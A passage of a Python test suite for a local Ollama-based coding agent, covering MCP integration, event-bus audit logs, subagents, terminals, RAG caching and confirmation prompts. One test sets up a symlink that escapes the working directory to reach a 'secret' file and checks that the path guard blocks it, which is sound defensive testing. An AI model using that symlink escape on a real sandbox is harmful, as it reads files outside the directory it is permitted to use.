    """Stage 65 (DeepSeek P1): real stdio MCP server end-to-end — start ->
    initialize handshake -> tools/list -> tools/call (direct + via mcp tool) ->
    resources -> error handling -> stop."""
    import mcp_client
    import json as _json
    repo = Path(__file__).resolve().parent
    server_script = repo / "mcp_servers.py"
    assert server_script.exists(), "built-in mcp_servers.py missing"
    old_cfg = mcp_client.CONFIG_PATH
    cfg = TMP / "mcp_integration.json"
    cfg.write_text(_json.dumps({"servers": [
        {"name": "local", "command": sys.executable,
         "args": ["-X", "utf8", str(server_script)]}]}))
    mcp_client.CONFIG_PATH = cfg
    try:
        clients = mcp_client.get_clients()
        assert "local" in clients, clients
        cl = clients["local"]
        started = cl.start()
        assert started and cl.ready, "real server failed to start"
        assert cl.server_info.get("serverInfo", {}).get("name") == "my-opencode-local", cl.server_info

        tools = mcp_client.mcp_tools_list()
        names = [t for s, t in tools if s == "local"]
        assert "echo" in names and "add" in names and "path_exists" in names, names

        r = mcp_client.mcp_call("local", "echo", {"text": "hello mcp"})
        assert "echo: hello mcp" in r, f"echo: {r}"
        r = mcp_client.mcp_call("local", "add", {"a": 2, "b": 3})
        assert "sum=5" in r, f"add: {r}"

        r = execute_tool("mcp", {"server": "_list"})
        assert "local" in r and "echo" in r, f"mcp _list via tool: {r}"
        r = execute_tool("mcp", {"server": "local", "call": "echo", "args": {"text": "via tool"}})
        assert "echo: via tool" in r, f"mcp call via tool: {r}"

        r = mcp_client.mcp_call("local", "resources/list", {})
        assert "local://readme" in r, f"resources/list: {r}"
        r = mcp_client.mcp_call("local", "resources/read", {"uri": "local://readme"})
        assert "Local MCP" in r, f"resources/read: {r}"

        r = mcp_client.mcp_call("local", "no_such_tool", {})
        assert "MCP error" in r, f"unknown tool must return error, got: {r}"

        verr = validate_tool({"tool": "mcp", "server": "local"})
        assert "call" in verr and "Missing required" in verr, f"validation error expected, got: {verr}"
    finally:
        mcp_client.CONFIG_PATH = old_cfg
        for c in list(mcp_client._procs.values()):
            c.stop()
        mcp_client._procs.clear()
    print("  [OK] MCP integration (real stdio server: start/list/call/resources/errors)")

def test_event_bus():
    """Stage 66: EventBus pub/sub — subscribe/publish/once/unsubscribe,
    handler exception isolation, clear."""
    from core.container import EventBus
    bus = EventBus()
    got = []
    bus.subscribe("a.b", lambda ev, pl: got.append((ev, pl)))
    bus.publish("a.b", {"x": 1})
    assert got == [("a.b", {"x": 1})], got

    once = []
    bus.once("a.b", lambda ev, pl: once.append(pl))
    bus.publish("a.b", 1)
    bus.publish("a.b", 2)
    assert once == [1], f"once fired twice: {once}"

    def boom(ev, pl):
        raise RuntimeError("subscriber bug")
    bus.subscribe("a.b", boom)
    bus.publish("a.b", "still ok")
    assert got[-1][1] == "still ok", "broken subscriber must not break the bus"

    assert bus.has_subscribers("a.b")
    tok = bus.subscribe("a.b", lambda ev, pl: None)
    bus.unsubscribe(tok)
    bus.clear()
    assert not bus.has_subscribers("a.b")
    print("  [OK] EventBus (pub/sub/once/isolated errors/clear)")

def test_event_bus_tool_events():
    """Stage 66: execute_tool publishes 'tool.executed' with ok/error flag."""
    from core import container
    old_bus = container._REGISTRY.get("event_bus")
    bus = container.new_event_bus()
    container.register("event_bus", lambda: bus)
    events = []
    bus.subscribe("tool.executed", lambda ev, pl: events.append(pl))
    try:
        r = execute_tool("read", {"path": "agent.py"})
        assert "#!/usr/bin/env python3" in r
        r = execute_tool("read", {"path": "no_such_file_zzz_12345.txt"})
        assert "not found" in r
    finally:
        if old_bus is None:
            container._REGISTRY.pop("event_bus", None)
        else:
            container.register("event_bus", old_bus)
    assert len(events) == 2, events
    assert events[0]["name"] == "read" and events[0]["ok"] is True, events
    assert events[1]["name"] == "read" and events[1]["ok"] is False, events
    print("  [OK] EventBus tool.executed events (ok/error)")

def test_event_bus_subagent_audit():
    """Stage 67: subagent.spawned/finished subscribers write the subagent trail."""
    import agent as agent_mod
    from core import container
    old_bus = container._REGISTRY.get("event_bus")
    bus = container.new_event_bus()
    container.register("event_bus", lambda: bus)
    agent_mod.setup_event_listeners()  # subscribes subagent events -> audit log
    audit_log = agent_mod.WORK_DIR / ".agent_subagent_audit.log"
    before = audit_log.read_text(encoding="utf-8") if audit_log.exists() else ""
    def mock_ollama(msgs, model):
        return ("subagent audit reply", 10)
    old = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        r = execute_tool("task", {"agent": "reviewer", "prompt": "check x"})
        assert "[SUBAGENT:reviewer]" in r, r
    finally:
        agent_mod.call_ollama = old
        if old_bus is None:
            container._REGISTRY.pop("event_bus", None)
        else:
            container.register("event_bus", old_bus)
    after = audit_log.read_text(encoding="utf-8") if audit_log.exists() else ""
    new_lines = [ln for ln in after.splitlines() if ln not in before.splitlines()]
    assert any("spawn reviewer" in ln and "check x" in ln for ln in new_lines), new_lines
    assert any("finished reviewer (ok)" in ln for ln in new_lines), new_lines
    print("  [OK] EventBus subagent spawn/finished -> .agent_subagent_audit.log")

def test_subagent_audit_api():
    """Stage 67: GET /api/subagents/audit returns recent subagent trail lines."""
    import agent as agent_mod
    from fastapi.testclient import TestClient
    from core import container
    old_bus = container._REGISTRY.get("event_bus")
    bus = container.new_event_bus()
    container.register("event_bus", lambda: bus)
    agent_mod.setup_event_listeners()
    def mock_ollama(msgs, model):
        return ("subagent api reply", 10)
    old = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        r = execute_tool("task", {"agent": "fixer", "prompt": "fix api"})
        assert "[SUBAGENT:fixer]" in r, r
        client = TestClient(agent_mod.app)
        r = client.get("/api/subagents/audit?limit=20")
        assert r.status_code == 200, f"subagents audit: {r.status_code} {r.text}"
        d = r.json()
        assert "lines" in d, d
        text = "\n".join(d["lines"])
        assert "spawn fixer" in text and "finished fixer (ok)" in text, text
    finally:
        agent_mod.call_ollama = old
        if old_bus is None:
            container._REGISTRY.pop("event_bus", None)
        else:
            container.register("event_bus", old_bus)
    print("  [OK] GET /api/subagents/audit")

def test_auto_pick_embed_model():
    """Stage 68 (DeepSeek P4): embed model auto-pick via `ollama list`;
    explicit EMBED_MODEL env always wins."""
    import agent as agent_mod
    def fake_run(cmd, **kw):
        class R:
            returncode = 0
            stdout = ("NAME                    ID              SIZE    MODIFIED\n"
                      "nomic-embed-text        abc             300MB   1 day ago\n"
                      "bge-m3                  def             1.2GB   2 hours ago\n"
                      "qwen3:8b                ghi             7.5GB   1 min ago\n")
        return R()
    old_run, old_env, old_embed = agent_mod.subprocess.run, os.environ.copy(), agent_mod.EMBED_MODEL
    agent_mod.subprocess.run = fake_run
    try:
        os.environ.pop("EMBED_MODEL", None)
        agent_mod.EMBED_MODEL = "nomic-embed-text"
        res = agent_mod._auto_pick_embed_model()
        assert res == "bge-m3", f"expected bge-m3, got {res}"
        os.environ["EMBED_MODEL"] = "my-custom-embed"
        agent_mod.EMBED_MODEL = "my-custom-embed"
        res = agent_mod._auto_pick_embed_model()
        assert res == "my-custom-embed", "explicit EMBED_MODEL must win"
    finally:
        os.environ.clear(); os.environ.update(old_env)
        agent_mod.subprocess.run = old_run
        agent_mod.EMBED_MODEL = old_embed
    print("  [OK] embed model auto-pick (ollama list, explicit env wins)")

def test_task_subagent_loop():
    """task tool delegates to a subagent that runs its own tool loop."""
    import agent as agent_mod
    import tools as tools_mod
    orig_c = agent_mod.call_ollama
    def mock_ollama(msgs, model):
        return ("subagent reply 12345", 10)
    agent_mod.call_ollama = mock_ollama
    try:
        r = tools_mod.execute_tool("task", {"agent": "general", "prompt": "explore x"})
        assert "[SUBAGENT:general]" in r, r
        assert "subagent reply" in r, r
    finally:
        agent_mod.call_ollama = orig_c
    print("  [OK] hierarchical subagent (tool loop)")

def test_task_subagent_reviewer_fixer():
    """Stage 64: task tool must accept reviewer/fixer agents and delegate
    with their prompts; invalid agent names still rejected."""
    import agent as agent_mod
    import tools as tools_mod
    orig_c = agent_mod.call_ollama
    seen = []
    def mock_ollama(msgs, model):
        seen.append(msgs[0]["content"][:40])
        return ("VERDICT: FAIL (mock)", 10)
    agent_mod.call_ollama = orig_c
    agent_mod.call_ollama = mock_ollama
    try:
        from tools import SUBAGENT_PROMPTS
        for ag in ("reviewer", "fixer"):
            r = tools_mod.execute_tool("task", {"agent": ag, "prompt": "check bug"})
            assert f"[SUBAGENT:{ag}]" in r, r
            assert "VERDICT" in r, r
        assert "REVIEWER agent" in seen[0], seen
        assert "FIXER agent" in seen[1], seen
        bad = tools_mod.execute_tool("task", {"agent": "nobody", "prompt": "x"})
        assert "must be one of" in bad, bad
    finally:
        agent_mod.call_ollama = orig_c
    print("  [OK] task tool: reviewer/fixer agents accepted")

def test_native_tools_schema():
    """native_tools_schema covers all tools incl. snapshot/restore; support
    detection matches only models known for native tool calling."""
    import tools as tools_mod
    s = tools_mod.native_tools_schema()
    names = {t["function"]["name"] for t in s}
    assert {"read", "write", "edit", "snapshot", "restore", "mcp"} <= names, names
    rd = next(t for t in s if t["function"]["name"] == "read")
    assert "path" in rd["function"]["parameters"]["required"]
    assert not tools_mod.native_supported("qwen2.5-coder:7b")
    assert tools_mod.native_supported("qwen3:8b")
    assert not tools_mod.native_supported("deepseek-r1:1.5b")
    print("  [OK] native tools schema + support detection")

def test_native_tool_calling():
    """Native tool calls (Ollama tools=) are executed, results fed back,
    final text returned; unsupported model falls back to legacy parser."""
    import agent as agent_mod
    import tools as tools_mod
    orig = tools_mod.native_chat
    calls = []
    demo = TMP / "demo_native.txt"
    demo.write_text("hello native world", "utf-8")
    def mock_native(messages, model, tools=None):
        calls.append(model)
        joined = " ".join(m.get("content", "") for m in messages)
        if "hello native world" in joined:
            return "FINAL ANSWER 42", [], 5
        return "", [{"name": "read", "arguments": {"path": ".test_tmp/demo_native.txt"}}], 5
    tools_mod.native_chat = mock_native
    old_env = os.environ.get("AI_NATIVE_TOOLS")
    os.environ["AI_NATIVE_TOOLS"] = "1"
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "read demo_native.txt"}], None,
            model="qwen3:8b")
    finally:
        tools_mod.native_chat = orig
        if old_env is None:
            os.environ.pop("AI_NATIVE_TOOLS", None)
        else:
            os.environ["AI_NATIVE_TOOLS"] = old_env
    assert "hello native world" in out, f"tool result missing: {out}"
    assert "FINAL ANSWER 42" in out, f"final answer missing: {out}"
    assert calls and calls[0].startswith("qwen3"), calls
    print("  [OK] native tool calling (tool_calls -> execute -> feedback -> answer)")

def test_desktop_helpers():
    """Desktop app: icon files are valid; port detection and readiness
    polling work against a temporary local HTTP server."""
    import desktop
    root = Path(__file__).resolve().parent
    ico = (root / "assets" / "icon.ico").read_bytes()
    png = (root / "assets" / "icon.png").read_bytes()
    assert ico[:4] == b"\x00\x00\x01\x00", "bad ICO header"
    assert png[:8] == b"\x89PNG\r\n\x1a\n", "bad PNG signature"
    assert len(png) > 100
    assert not desktop.is_port_open(9), "reserved/closed port must be closed"
    import http.server, threading
    class _Ok(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
        def log_message(self, *a):
            pass
    srv = http.server.HTTPServer(("127.0.0.1", 0), _Ok)
    port = srv.server_address[1]
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    try:
        assert desktop.is_port_open(port), "listening port must be open"
        assert desktop.wait_server_ready(port, timeout=5), \
            "readiness poll must succeed on a live HTTP server"
    finally:
        srv.shutdown()
        srv.server_close()
        time.sleep(0.3)
    assert not desktop.is_port_open(port), "port must be closed after shutdown"
    print("  [OK] desktop helpers (icons + port/readiness)")


def test_verify_py():
    r = verify_file(str(Path(WORK_DIR) / "agent.py"))
    print(f"  [OK] verify .py (result: {'OK' if not r else r[:50]})")

def test_verify_json():
    jf = TMP / "test.json"
    jf.write_text('{"a": 1}')
    r = verify_file(str(jf))
    print(f"  [OK] verify .json")

def test_backup_undo():
    tf = TMP / "test_bu.txt"
    tf.write_text("v1")
    backup(str(tf))
    tf.write_text("v2")
    r = execute_tool("undo", {"path": str(tf)})
    assert tf.read_text() == "v1", f"undo failed: {tf.read_text()}"
    print("  [OK] backup + undo")

def test_db_query():
    r = execute_tool("db_query", {"query": "SELECT 1 as a, 'x' as b"})
    assert "a | b" in r and "1 | x" in r, f"db_query failed: {r}"
    print("  [OK] db_query")

def test_testgen():
    f = TMP / "sample_mod.py"
    f.write_text("def add(a, b):\n    return a + b\n\ndef mul(a, b):\n    return a * b\n")
    r = execute_tool("testgen", {"path": str(f)})
    tp = TMP / "test_sample_mod.py"
    assert "Generated" in r and tp.exists(), f"testgen failed: {r}"
    content = tp.read_text()
    assert "test_add" in content and "test_mul" in content, "testgen missing functions"
    print("  [OK] testgen")

def test_validation():
    r = validate_tool({"tool": "write"})
    assert "Missing required" in r, "validation should reject missing content"
    r2 = validate_tool({"tool": "nope", "path": "x"})
    assert "Unknown tool" in r2, "validation should reject unknown tool"
    print("  [OK] validation")

def test_save_api():
    import requests
    from agent import app
    import threading, uvicorn
    # Use TestClient-style via running server is heavy; test endpoint via app
    # Direct: build the endpoint call
    from fastapi.testclient import TestClient
    client = TestClient(app)
    r = client.put("/api/file", json={"path": ".test_tmp/api_save.txt", "content": "saved"})
    assert r.json().get("ok"), f"save API failed: {r.json()}"
    assert (WORK_DIR / ".test_tmp/api_save.txt").read_text() == "saved"
    print("  [OK] save API (PUT /api/file)")

def test_terminal_api():
    from fastapi.testclient import TestClient
    client = TestClient(__import__("agent").app)
    r = client.post("/api/terminal", json={"cmd": "echo term_test_123", "cwd": ""})
    assert r.status_code == 200, f"terminal status {r.status_code}"
    assert "term_test_123" in r.text, f"terminal output missing: {r.text[:200]}"
    assert '"done": true' in r.text, "terminal missing done event"
    r2 = client.post("/api/terminal/kill")
    assert r2.json().get("killed", 0) >= 0
    print("  [OK] terminal (SSE)")

def test_pty_shell():
    """Interactive shell process: feed input, read output, exit."""
    from core.pty_shell import PtyShell
    sh = PtyShell([sys.executable, "-u", "-i"])
    got = b""
    deadline = time.time() + 12
    while time.time() < deadline and b"pty_ok" not in got:
        got += sh.read_available()
        sh.feed(b"print('pty_ok')\n")
        time.sleep(0.1)
    assert b"pty_ok" in got, f"no pty output: {got[:200]}"
    sh.feed(b"exit()\n")
    deadline = time.time() + 12
    while time.time() < deadline and not sh.dead:
        sh.read_available()
        time.sleep(0.1)
    assert sh.dead, "pty shell did not exit"
    print("  [OK] pty shell (interactive I/O)")

def test_ws_terminal():
    """WebSocket terminal: start python, run code, receive output."""
    from fastapi.testclient import TestClient
    client = TestClient(__import__("agent").app)
    with client.websocket_connect("/ws/term") as ws:
        ws.send_json({"cmd": [sys.executable, "-u", "-i"]})
        ws.send_json({"input": "print('ws_ok')\n"})
        got = ""
        deadline = time.time() + 15
        while time.time() < deadline and "ws_ok" not in got:
            m = json.loads(ws.receive_text())
            got += m.get("out", "")
            if "exit" in m:
                break
        assert "ws_ok" in got, f"no ws output: {got[:200]}"
        ws.send_json({"kill": True})
    print("  [OK] terminal (WebSocket)")

def test_deps_tool():
    r = execute_tool("deps", {})
    assert isinstance(r, str) and len(r) > 0, f"deps failed: {r}"
    assert "requirements" in r.lower() or "package" in r.lower() or "No dependency" in r, f"deps output unexpected: {r[:100]}"
    print("  [OK] deps")

def test_audit():
    log_file = WORK_DIR / ".agent_audit.log"
    before = log_file.read_text(encoding="utf-8") if log_file.exists() else ""
    execute_tool("list", {"path": "."})
    after = log_file.read_text(encoding="utf-8") if log_file.exists() else ""
    assert len(after) > len(before), "audit log not appended"
    lines = [l for l in after.splitlines() if l.strip()]
    assert any("list" in l for l in lines[-3:]), f"audit missing tool name: {lines[-3:]}"
    print("  [OK] audit log")

def test_rag_cache_incremental():
    from rag import init_rag, rag_search, _FILE_STATS
    import rag as rag_mod
    import shutil
    # isolate from any background RAG index left by earlier TestClient tests
    if rag_mod._BG_THREAD and rag_mod._BG_THREAD.is_alive():
        rag_mod._BG_THREAD.join(timeout=10)
    saved = (rag_mod.RAG_CHUNKS[:], rag_mod.RAG_INDEX, rag_mod.RAG_DIRTY,
             rag_mod.FAISS_INDEX, dict(_FILE_STATS))
    rag_mod.RAG_CHUNKS = []
    rag_mod.RAG_INDEX = None
    rag_mod.RAG_DIRTY = True
    rag_mod.FAISS_INDEX = None
    _FILE_STATS.clear()
    rdir = WORK_DIR / ".test_rag"
    shutil.rmtree(rdir, ignore_errors=True)
    rdir.mkdir(exist_ok=True)
    try:
        (rdir / "a.py").write_text("def alpha_func():\n    return 1\n", encoding="utf-8")
        init_rag(OLLAMA_URL="http://localhost:11434", WORK_DIR=rdir, EMBED_MODEL="nomic-embed-text")
        results = rag_search("alpha_func", top_k=5)
        assert isinstance(results, str) and "a.py" in results, f"rag search failed: {results}"
        stats1 = dict(_FILE_STATS)
        results2 = rag_search("alpha_func", top_k=5)
        stats2 = dict(_FILE_STATS)
        assert stats1 == stats2, "cache should be reused on unchanged file"
        (rdir / "a.py").write_text("def alpha_func():\n    return 2\n\ndef beta_marker():\n    pass\n", encoding="utf-8")
        rag_search("alpha_func", top_k=5)
        stats3 = dict(_FILE_STATS)
        assert stats3 != stats2, "cache should rebuild for changed file"
    finally:
        rag_mod.RAG_CHUNKS, rag_mod.RAG_INDEX, rag_mod.RAG_DIRTY, rag_mod.FAISS_INDEX = saved[:4]
        _FILE_STATS.clear()
        _FILE_STATS.update(saved[4])
        shutil.rmtree(rdir, ignore_errors=True)
    print("  [OK] RAG incremental cache")

def test_agent_loop_tool_call():
    """Integration: loop parses tool block, executes it, then returns final text.
    With events present the model response streams through stream_ollama."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return 'I will list files.\n```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done after listing.", 5
    def mock_stream(msgs, model, on_chunk=None):
        calls["n"] += 1
        if calls["n"] == 1:
            text = 'I will list files.\n```tool\n{"tool": "list", "path": "."}\n```'
        else:
            text = "Done after listing."
        if on_chunk:
            for i in range(0, len(text), 5):
                on_chunk(text[i:i+5])
        return text
    original = agent_mod.call_ollama
    original_stream = agent_mod.stream_ollama
    agent_mod.call_ollama = mock_ollama
    agent_mod.stream_ollama = mock_stream
    try:
        events = []
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "list files please"}], None,
            events=lambda e: events.append(e))
    finally:
        agent_mod.call_ollama = original
        agent_mod.stream_ollama = original_stream
    assert "Done after listing." in out, f"final text missing: {out[:300]}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    assert any(e.get("type") == "tool" and e.get("name") == "list" for e in events), \
        f"live tool event missing: {events}"
    assert any(e.get("type") == "text" for e in events), \
        f"streamed text events missing: {events}"
    print("  [OK] agent loop: tool execution + live streamed text events")

def test_agent_loop_plain_text():
    """Integration: loop returns plain text without tools (short question skips planner)."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return "Just a plain answer.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "hello"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "Just a plain answer." in out, f"plain loop failed: {out[:200]}"
    assert calls["n"] == 1, f"short question must not hit planner, got {calls['n']}"
    print("  [OK] agent loop: plain text")

def test_agent_loop_yaml_style_tool():
    """Integration: yaml-style `tool <name>` blocks (non-JSON) are parsed and executed."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return ('I will write the file.\n```python\n'
                    'tool write\npath "demo_yaml.py"\n'
                    'content "def add(a,b): return a+b"\n```'), 10
        return "File created.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = True
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "create file"}], None)
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
    assert "File created." in out, f"final text missing: {out[:300]}"
    p = WORK_DIR / "demo_yaml.py"
    assert p.exists(), "yaml-style write tool did not create file"
    assert "def add" in p.read_text("utf-8"), "file content mismatch"
    p.unlink(missing_ok=True)
    print("  [OK] agent loop: yaml-style tool blocks")

def test_agent_loop_planner_fallback():
    """Integration: planner (1.5b) without tool blocks doesn't kill the loop — main model retries."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        if len(calls) == 1:
            return "I'll just explain...", 5
        if len(calls) == 2:
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done after listing.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "Please implement a robust file parser with unit tests, error handling and docs for this project"}], None)
    finally:
        agent_mod.call_ollama = original
    assert len(calls) == 3, f"expected planner+main+final calls, got {len(calls)}: {calls}"
    assert calls[0] == agent_mod.PLANNER_MODEL, f"first call must be planner, got {calls[0]}"
    assert calls[1] == agent_mod.MODEL, f"fallback must use main model, got {calls[1]}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    print("  [OK] agent loop: planner fallback to main model")

def test_auto_confirm_safe():
    """AUTO_CONFIRM_SAFE=1: write to a NEW file executes immediately; writing
    an EXISTING file and bash still require 'yes'."""
    import agent as agent_mod
    import os as _os
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "write", "path": "auto_safe_new.txt", "content": "hello"}\n```', 10
        return "Done.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = False
    _os.environ["AUTO_CONFIRM_SAFE"] = "1"
    sid = "test-auto-safe"
    agent_mod._PENDING_CONFIRM.clear()
    try:
        new_f = WORK_DIR / "auto_safe_new.txt"
        if new_f.exists():
            new_f.unlink()
        out1 = agent_mod.run_agent_loop([{"role": "user", "content": "write a file"}], sid)
        assert "[CONFIRM]" not in out1, f"new-file write should not confirm: {out1[:200]}"
        assert new_f.exists() and new_f.read_text() == "hello", "new file not written"

        calls["n"] = 0
        calls["write_overwrite"] = False
        def mock2(msgs, model):
            calls["n"] += 1
            if calls["n"] == 1:
                return '```tool\n{"tool": "write", "path": "auto_safe_new.txt", "content": "overwrite"}\n```', 10
            return "Done.", 5
        agent_mod.call_ollama = mock2
        out2 = agent_mod.run_agent_loop([{"role": "user", "content": "overwrite"}], sid + "-2")
        assert "[CONFIRM]" in out2, "overwrite must confirm even with AUTO_CONFIRM_SAFE"
        assert new_f.read_text() == "hello", "existing file was overwritten without confirmation"
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
        _os.environ.pop("AUTO_CONFIRM_SAFE", None)
        agent_mod._PENDING_CONFIRM.clear()
        if new_f.exists():
            new_f.unlink()
    print("  [OK] AUTO_CONFIRM_SAFE: new file auto-write, overwrite still confirmed")

def test_confirm_yes_autoexec():
    """Bug: 'yes' after [CONFIRM] must re-execute the tool without a model call."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "write", "path": "confirm_demo.txt", "content": "hello"}\n```', 10
        return "Done.", 5
    original = agent_mod.call_ollama
    old_confirm = agent_mod.NO_CONFIRM
    agent_mod.call_ollama = mock_ollama
    agent_mod.NO_CONFIRM = False
    sid = "test-confirm"
    agent_mod._PENDING_CONFIRM.clear()
    try:
        out1 = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a file"}], sid)
        assert "[CONFIRM]" in out1, f"expected CONFIRM prompt: {out1[:200]}"
        assert not (WORK_DIR / "confirm_demo.txt").exists(), "file written before confirmation!"
        assert calls["n"] == 1, f"model should be called once before confirm, got {calls['n']}"
        p = agent_mod._PENDING_CONFIRM.get(sid)
        assert p and p[0] == "write", f"pending not stored: {agent_mod._PENDING_CONFIRM}"
        out2 = agent_mod.run_agent_loop(
            [{"role": "user", "content": "write a file"},
             {"role": "user", "content": "yes"}], sid)
        assert (WORK_DIR / "confirm_demo.txt").exists(), "tool not executed after 'yes'"
        assert "hello" in (WORK_DIR / "confirm_demo.txt").read_text("utf-8")
        assert calls["n"] == 2, f"model calls: 1st request + final answer expected, got {calls['n']}"
        assert "confirm_demo.txt" in out2, f"result missing from output: {out2[:300]}"
    finally:
        agent_mod.call_ollama = original
        agent_mod.NO_CONFIRM = old_confirm
        agent_mod._PENDING_CONFIRM.clear()
        (WORK_DIR / "confirm_demo.txt").unlink(missing_ok=True)
    print("  [OK] confirm flow: 'yes' auto-executes tool")

def test_agent_loop_model_param():
    """User-selected model must reach call_ollama (and skip the planner)."""
    import agent as agent_mod
    calls = []
    def mock_ollama(msgs, model):
        calls.append(model)
        return "Just text.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        agent_mod.run_agent_loop(
            [{"role": "user", "content": "hi"}], None, None, "qwen2.5-coder:7b")
    finally:
        agent_mod.call_ollama = original
    assert calls and all(m == "qwen2.5-coder:7b" for m in calls), \
        f"model param not honored: {calls}"
    assert len(calls) == 1, f"planner should be skipped entirely, got {len(calls)} calls"
    print("  [OK] agent loop: model param overrides planner")

def test_validate_tool_types():
    """Kimi P1: argument type/range validation (top_k>0, task.agent, todo.action, lsp.op)."""
    from tools import validate_tool
    cases = [
        ({"tool": "search", "query": "x", "top_k": 0}, True),
        ({"tool": "search", "query": "x", "top_k": 100}, True),
        ({"tool": "search", "query": "x", "top_k": 5}, False),
        ({"tool": "search", "query": 42}, True),
        ({"tool": "task", "agent": "hacker", "prompt": "x"}, True),
        ({"tool": "task", "agent": "explore", "prompt": "x"}, False),
        ({"tool": "todo", "action": "delete", "items": []}, True),
        ({"tool": "todo", "action": "complete", "index": 1}, False),
        ({"tool": "lsp", "operation": "hack", "path": "a.py"}, True),
        ({"tool": "lsp", "operation": "rename", "path": "a.py", "line": 0, "character": 0}, False),
        ({"tool": "bash", "cmd": 123}, True),
        ({"tool": "bash", "cmd": "echo hi"}, False),
        ({"tool": "mcp", "server": "fs"}, True),
        ({"tool": "mcp", "server": "fs", "call": "read_file", "args": {}}, False),
    ]
    for tc, expect_err in cases:
        err = validate_tool(tc)
        if expect_err:
            assert err, f"expected validation error for {tc}"
        else:
            assert not err, f"unexpected error for {tc}: {err}"
    print("  [OK] validate_tool: types/ranges/enums")

def test_symlink_safe_path():
    """Symlink/junction escaping WORK_DIR must be blocked."""
    import tools
    outside = Path(tempfile.mkdtemp())
    (outside / "secret.txt").write_text("s3cr3t", "utf-8")
    link = TMP / "evil_link"
    try:
        if hasattr(os, "symlink"):
            os.symlink(outside, link, target_is_directory=True)
        else:
            os.link(outside, link)
        if link.exists():
            rel = os.path.relpath(link)
            err = tools.ensure_safe_path(str(link))
            assert err is not None, "symlink escape must be blocked"
            err2 = tools.ensure_safe_path(rel)
            assert err2 is not None, "relative symlink escape must be blocked"
            print("  [OK] symlink/junction escape blocked")
        else:
            print("  [SKIP] symlink creation unsupported")
    except OSError as e:
        print(f"  [SKIP] symlink unsupported: {e}")
    finally:
        import shutil
        shutil.rmtree(outside, ignore_errors=True)
        shutil.rmtree(link, ignore_errors=True)

def test_main_model_freeform_retry():
    """Main model free-form answer (no tool blocks) gets one strict retry."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return "First I will explain the approach in detail and then do it.", 10
        if calls["n"] == 2:
            return '```tool\n{"tool": "list", "path": "."}\n```', 10
        return "Done.", 5
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "list"}], None, None, agent_mod.MODEL)
    finally:
        agent_mod.call_ollama = original
    assert calls["n"] == 3, f"expected free-form retry + tool + final, got {calls['n']}"
    assert "list" in out, f"tool result missing: {out[:300]}"
    print("  [OK] agent loop: free-form retry with strict hint")

def test_question_stops_loop():
    """Question tool ends the iteration (waits for user answer) instead of looping."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        return '```tool\n{"tool": "question", "text": "Which approach?", "options": ["A", "B"]}\n```', 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "[QUESTION]" in out, f"question not shown: {out[:200]}"
    assert calls["n"] == 1, f"loop must stop after question, got {calls['n']} calls"
    print("  [OK] agent loop: question stops iteration")

def test_plan_empty_guard():
    """Empty plan must not break the loop — agent gets a hint and continues."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
            return '```tool\n{"tool": "plan", "steps": []}\n```', 10
        return "plain answer, no plan needed", 10
    original = agent_mod.call_ollama
    agent_mod.call_ollama = mock_ollama
    try:
        out = agent_mod.run_agent_loop(
            [{"role": "user", "content": "who are you"}], None)
    finally:
        agent_mod.call_ollama = original
    assert "plan is empty" in out, f"hint missing: {out[:300]}"
    assert "plain answer" in out, f"loop must continue after empty plan: {out[:300]}"
    assert calls["n"] == 3, f"expected 2 calls + strict retry, got {calls['n']}"
    print("  [OK] agent loop: empty plan guard")

def test_skill_notfound_repeat_blocked():
    """Re-calling the same tool after a 'not found' result must be blocked
    even when args differ (model invented a skill name)."""
    import agent as agent_mod
    calls = {"n": 0}
    def mock_ollama(msgs, model):
        calls["n"] += 1
        if calls["n"] == 1:
